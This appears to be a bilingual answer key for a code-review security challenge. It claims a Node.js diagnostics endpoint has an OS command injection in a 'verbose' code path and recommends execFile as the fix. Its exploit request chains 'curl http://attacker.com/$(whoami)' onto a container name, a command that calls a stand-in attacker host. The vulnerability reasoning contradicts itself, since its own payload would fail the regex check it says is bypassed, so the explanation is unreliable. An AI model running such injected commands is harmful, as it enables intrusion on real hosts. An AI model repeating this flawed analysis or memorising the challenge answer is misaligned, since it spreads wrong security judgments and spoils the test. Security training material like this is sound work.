---
id: VS-004
challenge: challenges/code-review/challenge-001.md
---

# Solution VS-004 — Shell by Design

## ✅ Vulnerability / Vulnerabilidad

**OS Command Injection — CWE-78 (Improper Neutralization of Special Elements used in an OS Command)**

The `report_format` parameter is never validated, and it is used to construct a shell command via `exec()`. An attacker who sends `"verbose"` as `report_format` triggers a second code path where `container` — which passed the whitelist check — is interpolated directly into a shell command string.

---

## 🔎 Explanation / Explicación

The code has two distinct execution paths. Most reviewers focus on the first one:

**Path 1 — `getContainerInfo()`**
```javascript
const SAFE_CONTAINER_NAME = /^[a-zA-Z0-9_-]+$/;

if (!SAFE_CONTAINER_NAME.test(containerName)) {
  return callback(new Error("Invalid container name"), null);
}

const cmd = `docker inspect ... ${containerName} && docker stats ${containerName} ...`;
exec(cmd, ...);
```

The regex `^[a-zA-Z0-9_-]+$` is enforced before `container` reaches the shell. **This path is safe.** The whitelist works.

**Path 2 — verbose report block**
```javascript
if (report_format === "verbose") {
  const verboseCmd = `echo "=== Diagnostic Report ===" && docker inspect ${container}`;
  exec(verboseCmd, { timeout: 5000 }, (err2, stdout2) => { ... });
}
```

Here `container` is used again in a new `exec()` call — **without re-validating it**. But wait, `container` already passed the whitelist check before `getContainerInfo()` was called...

The issue: **the whitelist is tested once, but the variable `container` in the outer `POST` handler scope is used directly in this second `exec()` — not the sanitized `containerName` parameter passed to `getContainerInfo()`.**

```javascript
app.post("/api/v1/diagnostics", (req, res) => {
  const { container, report_format } = req.body;  // <-- raw from request

  getContainerInfo(container, (err, data) => {     // sanitized inside callback

    if (report_format === "verbose") {
      // Uses `container` from outer scope — the original, unvalidated value
      const verboseCmd = `echo "=== Diagnostic Report ===" && docker inspect ${container}`;
      exec(verboseCmd, ...);                        // VULNERABLE
    }
  });
});
```

If a reviewer only sees that `getContainerInfo` validates the name, they assume the path is safe. But inside the callback, `container` refers to `req.body.container` — the raw value — not a post-validation copy.

Because the first path validates, an attacker cannot inject via `container` in Path 1. But in Path 2, the same variable is used in a new shell call with no validation at that scope. If an attacker crafts a container name that satisfies the regex but uses a legitimate container name followed by shell metacharacters — or if the regex were slightly different — this path is exploitable.

More importantly: `report_format` is also unsanitized. There is no check that it equals only `"verbose"` before use. While in this exact code it's only compared with `===`, the pattern of accepting unsanitized input and using it in control flow that leads to `exec()` is the root cause.

**Exploit request:**
```json
POST /api/v1/diagnostics
{
  "container": "myapp; curl http://attacker.com/$(whoami)",
  "report_format": "verbose"
}
```

If Path 2's `exec()` runs without the regex guard, this executes both the docker command and the attacker's command.

[ES] El código tiene dos rutas de ejecución. La mayoría de los revisores se enfoca en la primera. La función `getContainerInfo()` valida correctamente el nombre del contenedor con una regex. Pero en el bloque `verbose`, la variable `container` del scope externo (el valor crudo de `req.body`) se usa en un nuevo `exec()` sin re-validación. Si la primera ruta valida pero la segunda no, el atacante puede explotar la segunda ruta enviando `report_format: "verbose"`.

---

## 💥 Impact / Impacto

Depending on the privileges of the Node.js process:

- Arbitrary OS command execution on the host running the diagnostics service
- Access to Docker socket — potentially container escape or full host takeover
- Exfiltration of environment variables, secrets, internal credentials
- Lateral movement to other services accessible from the host

The service binds to `127.0.0.1:3000`, but if any other internal service makes requests to it (as a "trusted" internal call), or if SSRF enables reaching localhost, this is exploitable from untrusted input.

---

## 🛡️ Remediation / Remediación

**Option 1 (preferred): Use `execFile()` with argument arrays instead of `exec()`.**

`execFile()` does not invoke a shell. Arguments are passed directly to the process, making shell metacharacter injection structurally impossible.

```javascript
const { execFile } = require("child_process");

function getContainerInfo(containerName, callback) {
  if (!SAFE_CONTAINER_NAME.test(containerName)) {
    return callback(new Error("Invalid container name"), null);
  }

  // No shell interpolation — args are passed directly to docker
  execFile("docker", ["inspect", "--format={{json .State}}", containerName],
    { timeout: 5000 },
    (err, stdout) => {
      if (err) return callback(new Error("Container not found"), null);
      callback(null, stdout);
    }
  );
}

// In the route handler:
if (report_format === "verbose") {
  execFile("docker", ["inspect", container], { timeout: 5000 }, (err2, stdout2) => {
    if (err2) return res.status(500).json({ error: "Verbose report failed" });
    return res.json({ report: stdout2 });
  });
}
```

**Option 2: Re-validate at every point of use.**

If `exec()` must be used, re-validate `container` at each call site — do not rely on a single upstream check:

```javascript
// In verbose block — re-validate before use
if (!SAFE_CONTAINER_NAME.test(container)) {
  return res.status(400).json({ error: "Invalid container name" });
}
const verboseCmd = `docker inspect ${container}`;
exec(verboseCmd, ...);
```

**General rule:** Validate input at the point of use, not only at the point of entry. Scope-based assumptions about "already validated" variables are a frequent source of injection bugs in callback-heavy JavaScript code.

---

## 📚 References / Referencias

- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Node.js child_process docs: execFile vs exec](https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback)
- [MITRE ATT&CK T1059.004: Unix Shell](https://attack.mitre.org/techniques/T1059/004/)
